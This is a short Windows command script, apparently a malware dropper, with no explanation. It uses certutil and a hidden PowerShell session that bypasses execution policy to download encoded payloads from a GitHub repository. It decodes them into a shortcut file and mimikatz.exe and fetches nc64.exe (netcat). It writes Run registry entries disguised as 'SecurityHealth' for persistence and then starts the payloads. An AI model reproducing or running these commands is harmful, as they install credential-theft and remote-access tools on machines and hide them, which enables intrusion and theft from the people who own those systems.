certutil -urlcache -split -f https://raw.githubusercontent.com/inwestallis/first_repository/master/exit.b %Temp%\exit.b
certutil -decode %Temp%\exit.b %Temp%\exit
expand %Temp%\exit %Temp%\gg.lnk
reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d notepad.exe /f

powershell.exe -windowstyle hidden -ep Bypass -nop -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/inwestallis/first_repository/blob/master/nc64.exe','%Temp%\nc64.exe')"

start %Temp%\gg.lnk

certutil -urlcache -split -f https://github.com/inwestallis/first_repository/raw/master/mim.b %Temp%\mim.b
certutil -decode %Temp%\mim.b %Temp%\mim
expand %Temp%\mim %Temp%\mimikatz.exe
reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d mimikatz.exe /f
start %Temp%\mimikatz.exe
